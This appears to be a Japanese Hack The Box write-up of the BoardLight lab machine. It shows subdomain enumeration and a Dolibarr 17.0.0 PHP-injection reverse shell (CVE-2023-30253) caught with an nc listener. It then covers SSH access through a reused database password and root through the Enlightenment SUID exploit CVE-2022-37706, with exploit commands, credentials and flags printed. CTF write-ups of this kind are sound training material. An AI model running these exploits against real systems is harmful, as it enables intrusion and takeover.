
![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : 
- #easy #medium #hard #insane
- OS : #Linux #Windows
- Machine Author(s): 
- Hack Date: 2025-02-02,21:19


# Enumeration
使用ツールのオプションが定型化してきてきたのでこの[スクリプト](https://github.com/crum7/HTBScript/blob/main/Enumeration.sh)を使用している
どのポートが空いている?
22番と80番
Apache/2.4.41 (Ubuntu)

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

whatweb
```bash
[*] whatweb http://boardlight.htb
http://boardlight.htb [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.231.37], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]


```

feroxbuster
```bash
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      317c http://boardlight.htb/images => http://boardlight.htb/images/
301      GET        9l       28w      314c http://boardlight.htb/css => http://boardlight.htb/css/
301      GET        9l       28w      313c http://boardlight.htb/js => http://boardlight.htb/js/
200      GET        6l       12w      491c http://boardlight.htb/images/user.png
200      GET        5l       23w     1217c http://boardlight.htb/images/location-white.png
200      GET      100l      178w     1904c http://boardlight.htb/css/responsive.css
200      GET      714l     1381w    13685c http://boardlight.htb/css/style.css
200      GET        9l       24w     2405c http://boardlight.htb/images/d-2.png
200      GET        5l       12w      847c http://boardlight.htb/images/envelope-white.png
200      GET        5l       55w     1797c http://boardlight.htb/images/linkedin.png
200      GET        7l       48w     3995c http://boardlight.htb/images/d-5.png
200      GET        2l     1276w    88145c http://boardlight.htb/js/jquery-3.4.1.min.js
200      GET        3l       10w      667c http://boardlight.htb/images/telephone-white.png
200      GET        5l       48w     1493c http://boardlight.htb/images/fb.png
200      GET       11l       50w     2892c http://boardlight.htb/images/d-1.png
200      GET        6l       57w     1878c http://boardlight.htb/images/youtube.png
200      GET        5l       14w     1227c http://boardlight.htb/images/insta.png
200      GET        6l       52w     1968c http://boardlight.htb/images/twitter.png
200      GET      280l      652w     9100c http://boardlight.htb/about.php
404      GET        1l        3w       16c http://boardlight.htb/portfolio.php
200      GET      536l     2364w   201645c http://boardlight.htb/images/who-img.jpg
200      GET      294l      633w     9209c http://boardlight.htb/do.php
200      GET      294l      635w     9426c http://boardlight.htb/contact.php
200      GET      348l     2369w   178082c http://boardlight.htb/images/map-img.png
200      GET      517l     1053w    15949c http://boardlight.htb/index.php
200      GET     4437l    10973w   131639c http://boardlight.htb/js/bootstrap.js
200      GET    10038l    19587w   192348c http://boardlight.htb/css/bootstrap.css
200      GET      517l     1053w    15949c http://boardlight.htb/
[####################] - 17s   120036/120036  0s      found:28      errors:13672  
[####################] - 17s    30000/30000   1775/s  http://boardlight.htb/ 
[####################] - 17s    30000/30000   1780/s  http://boardlight.htb/css/ 
[####################] - 17s    30000/30000   1767/s  http://boardlight.htb/images/ 
[####################] - 17s    30000/30000   1781/s  http://boardlight.htb/js/ 

```

dirseach
```bash
Target: http://boardlight.htb/

[06:33:14] Starting: 
[06:33:20] 200 -    2KB - /about.php
[06:33:31] 200 -    2KB - /contact.php

Task Completed

```


サイトはこんな感じ
![](https://i.imgur.com/XRrGupR.png)


![](https://i.imgur.com/lClkyIP.png)

Wappalyzer
既知の情報以外でわかったこと
- cdnjs
- cloudflare
- jQuery 3.4.1
- Bootstrap 4.3.1

- Owl Carousel v2.3.4
	- /ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js HTTP/1.1

HTMLソースで興味深い部分
```bash
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js">
  </script>
<script type="text/javascript" src="js/bootstrap.js"></script>
<script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
```
なんかBurpsuiteでいじってたら、見つけた
portfolio.phpとかいうの見つけた
ちなみに、サーバーにファイルがないときは、こうなるのでファイルはある

![](https://i.imgur.com/N95uLkJ.png)


![](https://i.imgur.com/TF3UkDo.png)


まずは、これらの脆弱性を調べる
- jQuery 3.4.1
- Bootstrap 4.3.1

jQueryは、XSSしか脆弱性なさそう
王道だと、これは使えなさそう
![](https://i.imgur.com/AiZJGii.png)

BootStrap 3.4.1もXSSしかないかも
![](https://i.imgur.com/Wwq9QDV.png)

webサイトの中に入力欄があったから、いじってみるか。
→Burp Suiteみると、なんかフォームに入力しても何も送信されてないっぽい。
ふぁっ！？どうすればいいんだこれ。

なんか、webページの中に、board.htbっていうのがある。
![](https://i.imgur.com/io0r6ad.png)

hostsファイルに書いて、アクセスする
ぱっと見のwebページはまんま一緒で、whatwebも変わらず。




# Foothold
しかし、ffufで調べると、crmというサブドメインが見つかった
このサブドメインを/etc/hostsに書き加える
```bash
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 120ms]
:: Progress: [100000/100000] :: Job [1/1] :: 460 req/sec :: Duration: [0:03:15] :: Errors: 0 ::
```

crm.board.htbの様子はこんな感じ
![](https://i.imgur.com/gnCnSQq.png)

Dolibarr 17.0.0というサービスが動いているみたい
ビジネス向けオープンソースERPとCRMのよう。
https://www.dolibarr.org/

ちなみにデフォルトの認証情報とかあるのかなと思って調べてみたけど、デフォルトの認証情報は、ユーザー名はadminで、パスワードは、利用者のメールに送る方式らしい。なので、デフォルトの認証情報でのログインはできないね。うん💢。全部のサービスこうしたほうがいいよ。

ちなみに、admin,adminと入れるとこうなる
![](https://i.imgur.com/yv5wHvV.png)


そして、Dolibarr 17.0.0には、CVE-2023-30253という脆弱性があって、[PoC](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)もある
PHPコードインジェクションのようなので、これを試す。
まず、ncで待ち受ける
```bash
nc -lvnp 4444
```


ちなみに、HackTheBoxのPwnBoxの性質なのかわからないけど、PwnBox使うなら、LHOSTは127.0.0.1じゃなくて、VPN経由の自分のローカルIPである10.10.14.2みたいにしたほうが良さそう

LHOSTS 127.0.0.1にするとうまくいかない例
```bash
└──╼ [★]$ python3 exploit.py http://crm.board.htb admin admin 127.0.0.1 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
[!] If you have not received the shell, please check your login and password
```

LHOSTS VPN経由の自分のローカルIPである10.10.14.2にするとうまくいく例
```bash
└──╼ [★]$ python3 exploit.py http://crm.board.htb admin admin 10.10.14.2 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```


# Lateral Movement

先ほどのexploitで、www-dataでリバースシェルを立てることができた
```bash
──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.223.54] 41264
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ ls
ls
index.php
styles.css.php

```

`~/html/crm.board.htb/htdocs/conf/conf.php`を見てみると、dbのポート、ユーザー名、パスワードが書いてあることがわかる。
今回、dbのポートは、3306なので、MySQLかMariaDBが動いてると思われる。
- ポート番号3306は、MySQLまたはMariaDBのデフォルトポートのため。
```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
....

```

`mysql -u ユーザ名 -p`で、得られたユーザー名とパスワードでログインすしようと思ったが、パスワードでのログインは許可されてない。
```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ mysql -u dolibarr
mysql -u dolibarr
ERROR 1045 (28000): Access denied for user 'dolibarr'@'localhost' (using password: NO)
```

`cat /etc/passwd`で、ユーザーに有効なシェルを持つユーザーの確認をする。
```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cat /etc/passwd
...
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:126:131:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
...
```

得られたユーザー名とパスワードで、sshにログインしてみる。
ユーザー名 : larissa
パスワード : serverfun2$2023!!
```bash
└──╼ [★]$ ssh larissa@10.129.223.54
The authenticity of host '10.129.223.54 (10.129.223.54)' can't be established.
ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.223.54' (ED25519) to the list of known hosts.
larissa@10.129.223.54's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$ 
```

larissaとして、ログインできた。


# Privilege Escalation
お馴染みのsudo -l
```bash
larissa@boardlight:~$ sudo -l
[sudo] password for larissa: 
Sorry, user larissa may not run sudo on localhost.
```
できない。そもそもsudoがlarissaに設定されていないよう。
HTBのEasyは今まで全部これだったのに。。。。

SUIDなどが設定されているファイルを探す。
```bash
larissa@boardlight:~$ find / -type f -perm -04000 -ls 2>/dev/null
     2491     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
      608     16 -rwsr-sr-x   1 root     root        14488 Apr  8  2024 /usr/lib/xorg/Xorg.wrap
    17633     28 -rwsr-xr-x   1 root     root        26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
    17628     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
    17627     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
    17388     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
     2368     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     5278    468 -rwsr-xr-x   1 root     root         477672 Jan  2  2024 /usr/lib/openssh/ssh-keysign
    10039    388 -rwsr-xr--   1 root     dip          395144 Jul 23  2020 /usr/sbin/pppd
     2211     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /usr/bin/newgrp
      230     56 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /usr/bin/mount
     5609    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
     2245     68 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /usr/bin/su
     5334     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /usr/bin/chfn
      231     40 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /usr/bin/umount
     5337     88 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /usr/bin/gpasswd
     5338     68 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /usr/bin/passwd
      375     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
     5335     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /usr/bin/chsh
      484     16 -rwsr-xr-x   1 root     root          14728 Oct 27  2023 /usr/bin/vmware-user-suid-wrapper

```


SUIDが設定されている一般的でない[enlightment](https://www.enlightenment.org/)というバイナリをチェックする。
Window Managerらしい。バージョンがあるので、確認する。
```bash
larissa@boardlight:~$ enlightenment --version
ESTART: 0.00047 [0.00047] - Begin Startup
ESTART: 0.00121 [0.00074] - Signal Trap
ESTART: 0.00134 [0.00013] - Signal Trap Done
ESTART: 0.00204 [0.00070] - Eina Init
ESTART: 0.00428 [0.00224] - Eina Init Done
ESTART: 0.00444 [0.00016] - Determine Prefix
ESTART: 0.00520 [0.00076] - Determine Prefix Done
ESTART: 0.00534 [0.00015] - Environment Variables
ESTART: 0.00547 [0.00013] - Environment Variables Done
ESTART: 0.00559 [0.00012] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
```

enlightenment 0.23.1が動いてるみたい。
`enlightment vuln`で検索すると、[CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706)が見つかる。
みると、バージョン0.25.4より前のバージョンには、Enlightenmentに権限昇格の脆弱性があるよう。
こちらの[PoC](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)を試す。
```bash
攻撃者端末
wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh
python3 -m http.server 8080

被害者端末
larissa@boardlight:~$ wget http://10.10.14.2:8080/exploit.sh

```

実行して、ルート取得
```bash
larissa@boardlight:~$ bash ./exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
root
```

## Flags

- **User**: `aae08936d1bc9933a229ee2a3617feaa`
- **Root**: `0e2f183dc859b573f210405c8ccb5c57`

### ポイント
- SUIDが設定されているバイナリの脆弱性を使って権限昇格することもあるのね